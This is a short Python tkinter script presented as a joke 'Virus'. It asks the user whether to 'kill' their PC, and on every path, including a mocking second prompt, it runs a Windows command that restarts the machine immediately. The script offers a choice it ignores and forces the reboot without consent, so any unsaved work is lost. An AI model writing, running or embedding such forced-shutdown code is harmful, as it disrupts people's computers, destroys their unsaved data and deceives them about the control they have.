import random
from typing import List
import tkinter as tk
from tkinter import messagebox
import os

# Create the main window
root = tk.Tk()

# Set the window title
root.title("My Window")



window_x:int = 500
window_y:int = 500
root.geometry(f"+{window_x}+{window_y}")

result = messagebox.askokcancel("Virus", "Do you want me to kill yuour pc")

if result:
    os.system("shutdown /r /t 0")
else:
    new_result = messagebox.askokcancel("Virus", "NO LOL I'M KILLING IT ANYWAY")
    if new_result:
        os.system("shutdown /r /t 0")
    else:
        os.system("shutdown /r /t 0")